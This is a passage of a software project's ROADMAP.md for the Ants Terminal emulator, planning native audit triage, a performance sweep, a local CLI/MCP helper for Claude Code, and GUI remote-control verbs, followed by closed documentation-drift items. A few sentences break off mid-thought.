- 📋 [ANTS-1111] **Fold `/audit` triage into the Project Audit
  tool — eliminate the LLM round-trip on the noise floor.**
  User ask 2026-04-30: "incorporate /audit into the Project
  Audit tool, comprehensive but minimising false positives
  and token usage." Today the Project Audit tool runs every
  detector natively (cppcheck, clazy, semgrep, ruff, bandit,
  gitleaks, trivy, custom rules) and produces a structured
  finding list — that part already needs no LLM. The LLM
  round-trip happens at **triage**: turning N raw findings
  into the K actionable ones. The `/audit` skill delegates
  this to the `audit-triage` subagent, which is the exact
  step ANTS-1111 absorbs.

  Mechanical noise filters (no LLM):

  1. **Pre-triage drop catalog** at
     `docs/audit-allowlist.md` (per ANTS-1107) — a
     human-readable JSON sidecar
     (`docs/audit-allowlist.json`) that maps `(rule_id,
     file_pattern, message_pattern)` triples to a verdict
     (`drop` | `info` | `keep`). The Audit tool reads it
     before rendering and skips rows matching `drop`. Each
     row carries a `reason` field so rejected findings can
     be re-litigated later.
  2. **Cross-tool corroboration scoring** — already partially
     in auditdialog (confidence 0-100 with +20 cross-tool).
     Extend: a finding flagged by ≥ 2 independent tools at
     the same `file:line` auto-promotes severity by one
     tier; a finding flagged only by one known-noisy rule
     auto-demotes by one tier. Tunable per-project via
     `.audit_rules.json`.
  3. **Framework auto-detect** — already on the `/audit`
     skill at the orchestration layer; lift into
     `audithygiene` so the tool knows that "this is a Flask
     project, run the Flask semgrep pack" without external
     prompting.
  4. **Inline suppression coverage** — auditdialog already
     parses `// NOLINT`, `# noqa`, `// nosemgrep`, etc. Add
     the unification: a single `// audit: drop[=rule]`
     comment suppresses across every detector at that
     `file:line`. Cuts the per-tool suppression noise.
  5. **Baseline diff** — auditdialog already supports trend
     snapshots; expose a "since-baseline" view that hides
     pre-existing findings and shows only what this commit
     introduced. The author's mental model is
     "what-did-I-just-break"; mechanical baseline diff
     answers it without an LLM.
  6. **AI-triage fallback** — a "Triage with AI" button that
     sends the *remaining* findings (after the mechanical
     filters) to the user's chosen LLM via `aidialog` for
     judgment on the genuinely-ambiguous tail. Optional;
     defaults off so the user never accidentally pays for
     triage tokens.

  Fold-into-roadmap step: a "Fold actionable into ROADMAP"
  button that templates a `### 🔍 Audit fold-in (YYYY-MM-DD)`
  block from the user-confirmed actionable list, allocates
  IDs from `.roadmap-counter`, writes the bullet bodies (with
  `Kind: audit-fix`, `Source: audit-YYYY-MM-DD`), and saves
  the file atomically. Pure mechanical.

  Allowlist learning loop: after triage, every "drop" the
  user confirms is offered as an allowlist addition with one
  click — appends to `docs/audit-allowlist.md` with a
  `reason:` field the user fills inline. Next run skips that
  finding silently. Over time the noise floor approaches
  zero without ever needing an LLM.

  Locked by `tests/features/audit_triage_native/` (drop
  catalog round-trip; corroboration-score arithmetic;
  framework auto-detect probe; baseline-diff exclude logic;
  fold-in templating produces a bullet conformant with
  roadmap-format.md § 3.5; allowlist append is atomic).

- 📋 [ANTS-1112] **Fold `/indie-review` orchestration into
  Ants Terminal — Claude does only the judgment.** User ask
  2026-04-30: "incorporate /indie-review as well,
  comprehensive but minimising false positives and token
  usage." The multi-agent independent review is currently
  100 % LLM-driven (one Claude Code subagent per subsystem).
  Most of the per-lane work is mechanical orchestration —
  ANTS-1112 lifts that out of Claude.

  Mechanical halves (Ants):

  1. **Subsystem partition** — read
     `docs/private/audit/indie-review-partition.md` (per the
     spec's probe-path convention) for an authoritative
     partition; if absent, derive a default partition from
     the source tree (one lane per `src/<dir>/`, big files
     split by line range). User can adjust before dispatch.
  2. **Per-lane brief assembly** — for each lane, concatenate
     the source paths + contract docs + external standards +
     ROADMAP slice (grep ROADMAP.md for the lane's
     basenames) + project-memory gotchas. All file IO +
     string concat. The brief is the verbatim text passed to
     the LLM — no LLM invocation yet.
  3. **Dispatch** — for each lane, send the assembled brief
     to the user's chosen LLM endpoint via `aidialog` (own
     credentials, own model). One call per lane;
     parallelisable via the existing process pool. Captures
     each lane's report verbatim.
  4. **Result aggregation** — collect per-lane reports,
     render in a tabbed panel ("Lane A" / "Lane B" / …),
     present verbatim with no synthesis filtering yet (per
     the spec's two-message pattern).
  5. **≥ 2-reviewer corroboration** — Ants extracts each
     report's findings (regex on `file:line` mentions) and
     marks any finding cited by ≥ 2 independent lanes as
     "gold signal". This is the false-positive filter the
     `/indie-review` skill describes as the most important
     output of the sweep — and it's a pure regex pass.
  6. **Synthesis** — *optional* second LLM call. The user
     clicks "Synthesise" and Ants sends the aggregated
     report set + threat-model docs (`CLAUDE.md`,
     `SECURITY.md`, `.semgrep.yml`) to the LLM for
     cross-cutting theme extraction + threat-model
     calibration + recommended action order. This step
     **is** LLM-shaped; budget is one synthesis call per
     review run. User can skip if they're comfortable
     reading the verbatim reports directly.
  7. **Fold-into-roadmap** — same templating as ANTS-1111
     but emits `### 🔍 Indie-review fold-in (YYYY-MM-DD)`
     with `Kind: review-fix`, `Source: indie-review-YYYY-MM-DD`.

  LLM-shaped halves (Claude or user's own LLM via aidialog):

  - The per-lane review judgment itself (one LLM call per
    lane × N lanes).
  - The synthesis step (one optional call per run).
  - Pre-pass: the user can ask aidialog to draft the
    partition file from the source tree if the project
    doesn't already have one — but this is a *one-time* per
    project setup cost, not per-review.

  Token-saving wins vs `/indie-review` today:

  - The orchestrator (parent Claude session) is no longer
    holding the entire per-lane briefing context in its own
    window — Ants assembles each brief and dispatches
    directly. Saves the orchestrator's full review-budget
    on every run.
  - Cross-lane corroboration is mechanical (regex), not an
    LLM step.
  - The verbatim-report rendering is mechanical (no LLM
    summarisation pass to filter the per-lane reports).
  - The fold-into-roadmap step is mechanical templating,
    not LLM drafting.

- 📋 [ANTS-1113] **Fold `/debt-sweep` into the Project Audit
  tool — four mechanical categories.** User ask 2026-04-30:
  "incorporate /debt-sweep too, comprehensive but minimising
  false positives and token usage." The skill originally scanned
  five categories of post-feature drift; per
  [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md)
  decision 9 the **memory drift** row is dropped (it required
  judgment to distinguish "moved file" from "stale behaviour" —
  better covered by the existing "verify before recommending from
  memory" rule). The remaining four categories all have a crisp
  mechanical signature; ANTS-1113 absorbs the scan into the
  Project Audit tool and reserves Claude only for the optional
  rule-on-it step.

  Per-category mechanical scan:

  | Category | Mechanical detector | LLM-shaped tail |
  |----------|--------------------|-----------------|
  | **Code drift** | (a) stale-type-name comments — grep comments for symbols not present in current code; (b) dead vars — clazy/cppcheck `unusedVariable` already caught in auditdialog; (c) `TODO` / `FIXME` markers added in scope — grep diff vs baseline; (d) `Q_UNUSED` / `_unused` markers wrapping a now-undeclared variable | "Is this stale comment actually wrong, or merely terse?" |
  | **Test coverage gaps** | Parse `spec.md` for `INV-N` markers, parse matching `test_*.cpp` / `test_*.py` for `INV-N` references, diff. New public methods without a `test_*` file in the same lane: cscope/ctags symbol-list vs test-file symbol-mention | "Is this method intentionally untested?" |
  | **Doc drift** | (a) ROADMAP ✅ items without a matching commit subject — grep git log for the ID; (b) CHANGELOG `[Unreleased]` bullets vs `git diff main..HEAD` file list; (c) README CLI flag references vs `ants-terminal --help` output | "Is this README wording correct or merely vague?" |
  | **Packaging drift** | Run `packaging/check-version-drift.sh` (already exists); diff CHANGELOG body vs metainfo `<release>` body vs debian/changelog body | None — pure mechanical |

  Workflow inside the Project Audit tool:

  1. New "Debt Sweep" tab next to "Audit" — runs the
     mechanical scan and presents findings grouped by category.
  2. Each finding has three buttons: **Fix inline** (apply the
     suggested edit, atomic), **Defer** (write a 📋 ROADMAP
     bullet with `Kind: chore` / `doc-fix` and `Source:
     debt-sweep-YYYY-MM-DD`), **Allow** (append to
     `docs/audit-allowlist.md` so future sweeps skip).
  3. The LLM-shaped tail (judgment column above) rolls up into
     a "Triage with AI" button at the bottom — sends only
     those findings to the user's chosen LLM via aidialog. Off
     by default; one click, one billable call. Most users will
     never need it.

  Auto-fix coverage (mechanical, no LLM):

  - Dead `Q_UNUSED(x)` where `x` is no longer declared → `git
    rm` the line.
  - `TODO: removed in 0.7.X` markers where 0.7.X has shipped →
    `git rm` the line.
  - ROADMAP ✅ items where the commit they cite no longer
    exists in `git log` → flip status to 📋 with "Re-verify"
    annotation.
  - CHANGELOG `[Unreleased]` bullet referring to a file not in
    the diff → mark with `<!-- stale? -->` HTML comment.

  Allowlist learning loop: same pattern as ANTS-1111. Every
  "Allow" entry the user confirms is appended to
  `docs/audit-allowlist.md` with the user's reason; future
  sweeps skip silently.

  Replaces the existing `/debt-sweep` skill end-to-end for
  Ants-Terminal-managed projects. The skill itself stays
  available for projects without Ants Terminal as a fallback.

  **Surviving candidates** (decided per user pull, gated on

  - **Output sanitiser** — strip ANSI / box-drawing / progress-bar
    fragments before re-feeding terminal output to an LLM. Pure
    regex pass; ~15 % token saving on long sessions.

### ⚡ Performance — hot-path sweep (user request 2026-04-30)

- 📋 [ANTS-1115] **Performance, performance, performance — full
  hot-path sweep across the ten subsystems that determine
  perceived speed.** User ask 2026-04-30: "performance,
  performance, performance — please think on how we can improve
  performance of Ants Terminal." Triage of every place where
  a measurable improvement is on the table, ranked by impact ×
  feasibility. Each row is its own feature-test'able lane so
  the sweep can ship one fix at a time with a perf benchmark
  guard.

  | # | Hot path | Current cost | Proposed change | Expected win |
  |---|----------|--------------|-----------------|--------------|
  | 1 | **VT parser printable runs** (`vtparser.cpp`) | State-machine traversal byte-by-byte, ~6 ns/byte at the steady state | SIMD scan (SSE2 / AVX2 — `_mm_cmplt_epi8` against `0x20` / `0x7F` / `0x1B`) for printable runs; emit one `Print` action per run instead of N | **3-5×** on `find /` / `tail -f /var/log/messages` style throughput |
  | 2 | **CSI parameter parsing** (`vtparser.cpp`) | `strtol` per parameter; allocates on long DCS sequences | Fixed-buffer `parseDecimal(begin,end)` returning `int + tail` — no allocation, no errno, no locale dispatch | **5-10×** on heavy SGR streams (vim, neovim, fzf preview) |
  | 3 | **Glyph shape cache** (`terminalwidget.cpp` QPainter path) | `QTextLayout` shaped per cell every paint when the cell content changes; no caching across frames | Persistent `QHash<(codepoint, fontStyle, sgrAttrs), QGlyphRun>` keyed on the shape inputs; LRU evict at ~50 k entries; reuse `QGlyphRun` directly via `QPainter::drawGlyphRun` | **2-4×** on text-heavy redraws (long lines, ligatures) |
  | 4 | **Damage-rect-bounded paint** (`terminalwidget.cpp`) | `paintEvent` repaints the whole visible grid even when one cell changed | Track per-cell dirty bits; `update(QRect)` only the dirty region; drop the full-grid path entirely once the per-cell path is proven | **5-10×** on output-light interactive sessions (typing, prompt redraws) |
  | 5 | **Scrollback ring buffer** (`terminalgrid.cpp`) | `QVector<TermLine>` — push grows/copies; trim shifts | True ring buffer (head index + size); allocate fixed 50 k slots once; `O(1)` push, `O(1)` trim | Latency stability — no pause on scrollback rotation |
  | 6 | **PTY read coalescing** (`ptyhandler.cpp`) | `QSocketNotifier` fires per readable; small `read()` chunks (~1 KB) | Drain up to 64 KB per wake; coalesce notifier wakeups; skip the parser when input is empty | **2×** on heavy-output processes (`yes`, `dd`, build logs) |
  | 7 | **Search lazy-lower index** (`terminalwidget.cpp` find feature) | Linear scan + per-call `toLower()` on every line | Maintain a per-line lowercased mirror computed once on append; reuse on every search; Boyer-Moore for the substring match | **10-20×** on scrollback search |
  | 8 | **Audit dialog virtualisation** (`auditdialog.cpp`) | Single `QTextBrowser` building the entire findings HTML | Switch to a `QListView` + custom delegate for findings; render only visible rows; snippet/blame fetched on demand | **5-20×** on >500-finding sweeps; bounds memory |
  | 9 | **Roadmap dialog incremental parse** (`roadmapdialog.cpp`) | Full re-parse on every open; >3000-line ROADMAP.md takes ~80 ms | Cache the parsed model; invalidate via the existing `QFileSystemWatcher`; incremental re-parse only the affected `##` block on file change | **10×** dialog-open latency |
  | 10 | **Startup time** (`main.cpp`) | Cold start ~250 ms with full subsystem init (Lua, plugin discovery, audit tool init, theme load) | Defer Lua / audit / plugin init to first-use; load themes on first SettingsDialog open instead of `MainWindow` ctor; precompiled headers in CMake | **30-50 %** off cold-start |

  Cross-cutting build-side wins:

  - **Precompiled headers** in `CMakeLists.txt` — `target_precompile_headers(ants-terminal PRIVATE <Qt6Headers>)`; cuts incremental build by ~20 %.
  - **Link-time-optimisation** — already on for Release; verify the LTO flags propagate to the test binaries too (faster test-suite runs).
  - **Shared static lib for `src/*.o`** — currently every test binary recompiles every source it links; consolidate into a static lib once and link against it.
  - **Profile-guided optimisation** — record a profile during a representative session (vim + tmux + claude code), feed back into the Release build. ~5-10 % steady-state win.

  Measurement infrastructure:

  - `tests/benchmarks/bench_vt_throughput.cpp` already exists.
    Add: `bench_paint_throughput.cpp`, `bench_search_throughput.cpp`,
    `bench_audit_render.cpp`, `bench_roadmap_parse.cpp`. Each
    captures a wall-time number; CI publishes them as artifacts;
    a regression in any benchmark > 10 % fails the PR.
  - **Steady-state replay corpus** — record a 5-minute session
    of typical use (vim + tmux + claude + browser-of-logs),
    serialise the byte-stream, replay through VtParser in the
    benchmark. Reproducible perf numbers.
  - **Frame-time histogram** — `terminalwidget.cpp` already
    has `m_lastPaintMs`; expose as a debug overlay
    (Ctrl+Shift+F12 toggle); P50/P95/P99 visible during real
    use.

  Anti-goals (out of scope):

  - **Custom rendering toolkit** (Skia, a glyph atlas only,
    direct GPU). The QPainter+QTextLayout path is fast
    enough once the cache is in place; ANTS-1024 retired the
    glrenderer experiment in 0.7.44 with this exact lesson.
  - **Multi-threaded VT parser** — the parser is sequential
    (state machine); parallelising introduces synchronisation
    overhead that kills the win. Stay single-threaded; let
    SIMD do the heavy lifting.
  - **Replacing Qt with a lighter toolkit** — Qt6 is the only
    runtime dep; switching costs years and produces no user-
    visible win.

  Locked by `tests/features/perf_sweep/` (per-row perf
  benchmark with a regression threshold). Each row of the
  table ships as its own commit with the matching
  `bench_*.cpp` regression test. Nothing in this bullet is
  one big refactor; it's ten small, measurable, individually
  shippable wins.
  Kind: refactor.

### ⚡ Local-subagent framework — Claude offloads to the local machine (user request 2026-04-30)

> **Strategic theme.** Inverse of ANTS-1108..ANTS-1114 (which
> are Ants-driven offloads from Claude). Here the user wants
> *Claude itself* to know "this task can run locally on the
> user's machine instead of in the cloud" and dispatch to it.
> Direct user motivation: cost — Claude Code subscriptions
> billed in USD are heavy in ZAR (or any non-USD currency);
> every token saved is a real economic win. The framework
> below is the lever that lets Claude *prefer* local execution
> for any task that's mechanical / structured / large-output.

- 📋 [ANTS-1116] **Local-subagent framework — Ants exposes
  mechanical helpers as a CLI library + MCP server so Claude
  Code can invoke them as tools instead of doing the work in
  tokens.** User ask 2026-04-30: "When it makes sense to do
  so, Claude Code must offload certain tasks to the local
  machine instead of sending it to the cloud, also reducing
  token usage. Please think of a framework on how to achieve
  this. So, think of the local machine as a subagent that can
  perform certain tasks on behalf of Claude Code." Direct
  cost framing: South Africa rand-vs-dollar makes per-token
  cost real; the same task done locally costs zero.

  Architecture, three layers:

  1. **CLI library** — a single binary `ants-helper` (shipped
     alongside the `ants-terminal` package) with subcommands.
     Each subcommand reads JSON from stdin or argv, writes
     structured JSON to stdout, exits non-zero on error with a
     stderr message. Discoverable via `ants-helper list` and
     `ants-helper <cmd> --help`. Subcommands:

     | Subcommand | Input | Output | Token-saving vs Claude doing it directly |
     |------------|-------|--------|-----------------------------------------|
     | `test-runner` | `{"label": "fast", "filter": "..."}` | `{"passed": N, "failed": [{"name", "log"}], "duration_ms"}` | ~5 KB CTest output → ~500 B JSON. **10×** |
     | `audit-run` | `{"tools": ["cppcheck","clazy"], "scope": ["src/"]}` | `{"findings": [...]}` triaged by mechanical filters | ~50 KB raw → ~2 KB triaged JSON. **25×** |
     | `audit-fold-in` | `{"findings": [...], "date": "2026-04-30"}` | Writes `### 🔍 Audit fold-in (...)` block atomically; emits new IDs | Replaces Claude-drafted ROADMAP block (~3 KB output) with a single-line "wrote N bullets" ack. **30×** |
     | `id-allocate` | `{"count": 1}` | `{"ids": ["ANTS-1117"], "next_counter": 1117}` | Replaces a 5-step Claude flow (read counter, increment, write, return) with one local op |
     | `roadmap-status` | `{"id": "ANTS-1102", "to": "✅"}` | `{"ok": true, "before": "🚧", "after": "✅"}` | Replaces Claude editing the file. **20×** on confirmation tokens |
     | `changelog-flip` | `{"version": "0.7.56", "date": "2026-04-30"}` | Moves `[Unreleased]` → `[X.Y.Z] - YYYY-MM-DD` atomically | Replaces a multi-edit Claude flow |
     | `bump` | `{"version": "patch"\|"minor"\|"major"\|"X.Y.Z"}` | Applies the `.claude/bump.json` recipe; runs `post_check`; reports drift | Replaces 30+ Edit calls per release |
     | `drift-check` | `{}` | `{"clean": true}` or `{"violations": [...]}` | Trivial wrapper around `packaging/check-version-drift.sh` but consumed structured |
     | `spec-parse` | `{"path": "tests/features/foo/spec.md"}` | `{"theme": "...", "invariants": [{"id":"INV-1", "text":"..."}]}` | Saves Claude reading the spec to extract the structure |
     | `spec-test-coverage` | `{"spec": "...", "test": "..."}` | `{"missing_invariants": ["INV-3"]}` | Replaces a careful Claude diff |
     | `git-diff-summary` | `{"range": "main..HEAD"}` | `{"files_changed": N, "lines_added": M, "by_dir": {...}}` | Replaces a 50 KB diff Claude has to read |
     | `pr-create` | `{"title", "body"}` | Runs `gh pr create`; returns URL | Saves the orchestration round-trip |
     | `ci-watch` | `{"run_id": ...}` | `{"status", "conclusion", "duration_ms"}` | Replaces `gh run watch` orchestration |
     | `debt-sweep` | `{"since": "<ref>"}` | `{"trivial_fixes": [...], "behavioral": [...]}` per ANTS-1113 | Replaces the LLM-driven /debt-sweep entirely for the mechanical 95 % |
     | `indie-review-prep` | `{"partition": "..."}` | Per-lane briefs as JSON (one per lane) ready to dispatch via aidialog | Replaces orchestrator's per-lane context-budget |
     | `grep-bounded` | `{"pattern", "scope", "max_results": 50}` | `{"matches": [...]}` truncated cleanly | Replaces unbounded grep that floods the context |
     | `git-blame` | `{"file", "line"}` | `{"sha", "author", "date", "message"}` | Replaces Claude reading 30 lines of `git blame` output |

  2. **MCP server** — `ants-mcp-server` (a thin wrapper over
     the CLI library that conforms to the
     Model-Context-Protocol stdio transport). Claude Code
     declares it in `~/.claude/.mcp.json` once. Each
     subcommand becomes an MCP tool with structured `input
     schema` (so Claude knows the shape before calling) and
     structured `output schema` (so Claude can parse the
     response without LLM-tokens of "let me figure out the
     format"). The MCP tool descriptions are short and
     specific — Claude picks the right tool because the
     description nails what it does.

  3. **Behavioural-bias rules in `~/.claude/CLAUDE.md`** — a
     new section §8 telling Claude to *prefer* the local
     subagents:

     > "When you need to run tests, run audits, allocate a
     > ROADMAP ID, update CHANGELOG / ROADMAP status, bump a
     > version, fetch git blame, summarise a diff, prepare a
     > PR, watch CI, or perform any other mechanical /
     > structured / large-output task: invoke the
     > corresponding `ants-*` MCP tool (or `ants-helper
     > <subcommand>` via the Bash tool when MCP isn't
     > available) instead of doing it yourself in tool calls.
     > Doing it yourself burns tokens on output that the
     > local helper can deliver as structured JSON in 1 / 10
     > the size."

     Claude Code already has the disposition to prefer
     skills and hooks (per `feedback_skills_hooks.md`); this
     section extends that disposition to local helpers.

  Discovery + adoption flow for a new project:

  1. User installs `ants-terminal` (which ships
     `ants-helper` + `ants-mcp-server` in the same package).
  2. `ants-mcp-server --install` writes a default
     `~/.claude/.mcp.json` entry; user can disable per-session
     with `claude --no-mcp ants-mcp` if they ever want to
     A/B-compare token costs.
  3. First Claude Code invocation auto-discovers the tools.
  4. Claude prefers them per the §8 rule; the user sees the
     token bill drop measurably on the first heavy session.

  Token-budget projection (rough order-of-magnitude on a
  typical day's work):

  | Workflow | Today (LLM does it) | With ANTS-1116 | Savings |
  |----------|---------------------|----------------|---------|
  | Run tests + interpret | ~5 K input + ~1 K output | ~200 input + ~200 output | ~6× |
  | Run /audit + triage | ~50 K input + ~5 K output | ~2 K input + ~1 K output | ~18× |
  | Allocate ID + write CHANGELOG flip + commit + tag | ~3 K input + ~2 K output (multi-Edit) | ~300 input + ~100 output | ~13× |
  | Run /indie-review (orchestration only) | ~30 K input + ~5 K output | ~3 K input + ~1 K output | ~9× |
  | Run /debt-sweep | ~10 K input + ~3 K output | ~500 input + ~300 output | ~16× |

  Rough composite: a typical day of mechanical work that
  would burn ~300 K tokens today drops to ~30 K. **10×
  cost reduction** for the user, with no loss in
  functionality — Claude is still in the loop for every
  judgment / drafting decision.

  v1 deliverable (smallest shippable slice):

  - `ants-helper test-runner` + `ants-helper id-allocate` +
    `ants-helper drift-check`. Three subcommands, three
    feature tests, one CLAUDE.md rule. Ship behind a
    `--enable-helper-cli` CMake option so the CLI is
    distinct from the GUI binary.
  - Validate the per-call token savings on a real Claude
    Code session before expanding the surface.

  v2: add the audit / roadmap / debt-sweep subcommands once
  the infrastructure is proven.
  v3: full MCP server with tool-discovery.
  v4: expand to user's `~/.claude/CLAUDE.md` so the §8 rule
  is global.

  Locked by `tests/features/local_subagent_framework/`
  (round-trip determinism per subcommand; JSON-shape
  conformance to a versioned schema; CLI version-skew

- 📋 [ANTS-1117] **Claude-Code → running-Ants GUI IPC — let
  Claude invoke Ants's built-in panels and actions on the live
  instance.** User ask 2026-04-30: "Can we update Ants Terminal
  to allow Claude Code to invoke certain actions? Like run the
  Project Audit tool that is built into Ants Terminal? I would
  like Ants Terminal and Claude Code to be heavily integrated."
  Companion to ANTS-1116 (the *stateless* CLI/MCP helper
  framework) — this bullet covers the *stateful* GUI-aware
  integration where Claude tells the running Ants Terminal
  process to do something a panel/dialog already does, and gets
  the output back as structured JSON.

  Architecture rests on existing infrastructure: Ants Terminal
  already ships a Kitty-style remote-control IPC at
  `src/remotecontrol.{h,cpp}` exposing `ls`, `select-window`,
  `set-title`, `get-text`, `launch` over a Unix-domain socket
  (gated by the `remote_control_enabled` config key for trust).
  ANTS-1117 extends the verb set; no new transport, no new
  trust model.

  New verbs (each translates Claude's request → existing GUI
  action → structured JSON response):

  | Verb | Calls into | Returns |
  |------|-----------|---------|
  | `audit-run` | `AuditDialog::runAudit()` (auditdialog.cpp) | `{"findings": [...], "trend": {...}, "duration_ms": N}` — same JSON the SARIF export emits, no rendering pass |
  | `audit-fold-in` | `AuditDialog::foldIntoRoadmap()` (per ANTS-1111) | `{"new_ids": [...], "block_written": "..."}` |
  | `roadmap-show` | Opens `RoadmapDialog`; honours filter / search query passed in | `{"opened": true, "filter_applied": "..."}` |
  | `roadmap-query` | Same parser, no UI | `{"bullets": [{"id", "status", "kind", "headline", ...}]}` — Claude can interrogate the roadmap without opening the dialog |
  | `tab-list` | `MainWindow::tabsAsJson()` (new helper) | `{"tabs": [{"index", "title", "cwd", "shellPid", "claude_running": bool, "color"}]}` |
  | `tab-close` | Routes through `MainWindow::closeTab` (so the ANTS-1102 confirm-on-close logic runs) | `{"closed": true\|false, "blocked_by": "<process>"}` |
  | `tab-rename` | Honours the manual-rename pin (per existing ANTS-1083 work) | `{"renamed": true, "title": "..."}` |
  | `terminal-write` | Pastes text into the active tab's TerminalWidget | `{"written_bytes": N}` |
  | `theme-apply` | `MainWindow::applyTheme(name)` | `{"applied": "...", "previous": "..."}` |
  | `claude-detect` | Reads the Claude-detection state | `{"running": true, "tab": N, "model": "...", "session_path": "..."}` |
  | `bg-tasks-list` | `ClaudeBgTaskTracker::tasks()` | `{"tasks": [{"id", "name", "started_at", "status"}]}` |
  | `screenshot-capture` | Renders the active tab to a PNG | `{"path": "/tmp/ants-screenshot-...png"}` |
  | `notification-show` | `QSystemTrayIcon::showMessage` | `{"shown": true}` |
  | `audit-allowlist-add` | Atomic append to `docs/audit-allowlist.json` (per ANTS-1111) | `{"appended": true, "rule": "...", "reason": "..."}` |
  | `id-allocate` | Same as the CLI helper but on the running instance | `{"id": "ANTS-1118"}` |

  Wire path: Claude Code invokes via the existing `Bash` tool
  with `kitten @ <verb> <args>`-style command, OR via an MCP
  tool from the ANTS-1116 server that translates MCP calls →
  IPC writes on the existing socket. No new transport.

  Trust model: the `remote_control_enabled` config key already
  gates the socket; default off. When the user opts in, the
  socket sits in `$XDG_RUNTIME_DIR/ants-terminal-<pid>.sock`
  (already 0700 perms). Claude Code can only access it if it
  shares the user's UID — which it does, since it runs as the
  user. No network exposure.

  Token-saving wins (this builds on top of ANTS-1116):

  - `audit-run` returns triaged JSON directly — Claude doesn't
    re-trigger the LLM-driven audit-triage subagent. ~25× over
    the LLM-orchestrated flow.
  - `roadmap-query` returns parsed bullets as structured data —
    Claude doesn't re-read the 3000-line ROADMAP.md every time
    it needs to know "which bullets are 🚧?".
  - `tab-list` + `claude-detect` give Claude operational
    awareness of the user's terminal state without burning
    context-window tokens reading screenshots / `ps` output /
    `gh api` queries.

  Why a separate bullet from ANTS-1116:

  - ANTS-1116 is *stateless* — `ants-helper audit-run` works
    even with no GUI running; it spawns the audit, returns JSON,
    exits. The user might never see the output rendered.
  - ANTS-1117 is *stateful* — `kitten @ audit-run` talks to
    the running Ants Terminal; the user sees the audit panel
    populate live; Claude gets the same JSON back. The result
    of the action persists in the GUI for the user's later
    inspection.

  Both are useful — they cover different workflows. v1 ships
  ANTS-1116 first (lower coupling, easier to test), then
  ANTS-1117 layers on top (each verb is a thin GUI wrapper
  over an already-tested action).

  Far-future deferred (per user 2026-04-30): "allow these
  features to be integrated with the various AI platforms but
  for now, let's focus on Claude Code." → 💭 [ANTS-NNNN+]
  candidates: Codex CLI integration, Aider integration, Ollama
  + open-router agentic shells. Same MCP-tool surface; just
  needs each platform's tool-discovery mechanism to find the
  Ants MCP server. Mechanical work, no architectural shift.

- ✅ [ANTS-1121] **HIGH — Documentation drift fold-in.**
  Closed 2026-04-30 after a per-theme audit reconciled current
  state against the original 9-theme finding list. Most fixes
  had landed in flight during the 0.7.50–0.7.59 cycle; the
  reconciliation pass below confirms each.
  Source: doc-cold-eyes-2026-04-30. Kind: doc-fix.
  Lanes: docs (root + standards + decisions + specs), packaging,
  README, CHANGELOG.

  **Resolution by theme:**
  - **T1 (GPU renderer cleanup in STANDARDS.md / RULES.md)** —
    deferred to ANTS-1105, which retires both files entirely.
    Targeted edits to remove only the GPU references would be
    wasted work given the planned full removal.
  - **T2 (version pinning drift)** — PLUGINS.md updated to
    v0.7.58+ stamp with explicit "the plugin surface hasn't
    grown since 0.6.9 — per-event markers below remain
    accurate" disclaimer; SECURITY.md "Last updated for"
    refreshed to 0.7.59; CONTRIBUTING.md example commit
    subject uses 0.7.59:; packaging/README.md has no stale
    0.6.x references; README.md install URL up to date.
  - **T3 (archival docs at root)** — DISCOVERY.md, AUDIT.md,
    FIXPLAN.md, project_audit_updates.md all removed from
    repo root.
  - **T4 (spec self-fixes from cold-eyes pass 2)** —
    ANTS-1116.md drift-detection contract clarified
    (INV-3 + INV-3a + INV-8 disambiguate clean/drift/handler-
    error via exit codes 0/3/1); raw + exit_code now pinned
    by INV-3a; ANTS-1117.md notes parseBullets is "to be
    extracted as part of this bullet's implementation" and
    INV-6 cites ClaudeTabTracker::shellState (not
    ClaudeTabIndicator::isActive); ADR-0002 line 131 carries
    the concrete pointer.
  - **T5 (ROADMAP section-target drift)** — `## 0.7.0`,
    `## 0.7.7`, `## 0.7.12`, `## 0.7.50–0.7.59` headings all
    say "shipped 2026-04-XX" instead of "(target: 2026-XX)".
  - **T6 (Source: backfill tail)** — 44 bullets still missing
    Source field. Deferred to ANTS-1129 below as a dedicated
    backfill task — too large to fold inline.
  - **T7 (ANTS-1054 status)** — body now reads "Steps (c) and
    (d) still pending" reflecting the 0.7.58 step-(b) ship.
  - **T8 (audit-report archive hygiene)** —
    AUTOMATED_AUDIT_REPORT.md removed; AUDIT_TRIAGE_2026-04-16.md
    carries an explicit "historical snapshot, not current
    state" header.
  - **T9 (minor placeholder/tone fixes)** — legend wording
    updated ("active commit work — usually direct-to-main");
    the L3812 ANTS-1118+ placeholder removed; only the
    ANTS-NNNN+ form remains; EXPERIMENTAL.md has no stale
    0.6.x markers.

- ✅ [ANTS-1129] **`Source:` field backfill across ROADMAP.md.**
  Closed 2026-04-30. 36 long-term roadmap bullets in 0.8.0+
  "Considered/planned" sections gained explicit
  `Source: planned`. Bullets ANTS-1060, 1061, 1062, 1064,
  1066–1098 (with gaps where IDs already had Source). The
  four bullets at the top of the 0.8.0 "🧪 Future external-
  signal lanes" subsection (ANTS-1003–1006) deliberately
  remain without an explicit per-bullet Source — their
  section heading "Future external-signal lanes (carry from
  the 2026-04-23 review)" makes
  `Source: indie-review-2026-04-23` unambiguous per § 3.5
  inheritance. Total `Source:` count across the file:
  68 → 104. Mechanical fix; no bullet reordering or content
  edits beyond the appended field. Kind: doc-fix.
  Source: doc-cold-eyes-2026-04-30. Lanes: ROADMAP.

  **Theme T1 — GPU-renderer removal not propagated.** `glrenderer.cpp`
  was retired in 0.7.44 (CHANGELOG line 1001). README.md:50 reflects
  this; STANDARDS.md:39-45 still describes a live GPU path
  (QOpenGLWidget, 2048x2048 atlas, GLSL 3.3, "two-render-paths
  invariant"); RULES.md:37 / 168 still list `GlRenderer` and a
  "GPU rendering toggle works without artifacts" release-checklist
  item. Remove or mark deprecated.

  **Theme T2 — Version pinning drift.** PLUGINS.md is stamped 0.6.9
  throughout (lines 3, 23, 161, 163, 247, 271, 332-337, 422, 426,
  534, 554, 556, 584); shipped is 0.7.58. SECURITY.md:18 supported-
  versions table shows `0.6.x` as current (line 162: "Last updated
  for the 0.6.16 release"). packaging/README.md:9, 118, 174 lock
  recipe versions at 0.6.20/0.6.21. CONTRIBUTING.md:126 example
  commit subject is `0.6.7:` (predates the `<ID>: <description>`
  standard from `docs/standards/commits.md`). README.md:481 install
  snippet comment says "replace 0.7.44" but URL hardcodes 0.7.58 —
  pick one. PLUGINS.md "Roadmap" section (lines 570-576) marks
  0.7-series `output_line` / `ants.trigger.register` items as
  still-planned — verify whether they shipped during 0.7.x.

  **Theme T3 — Archival docs at root pretending to be live.**
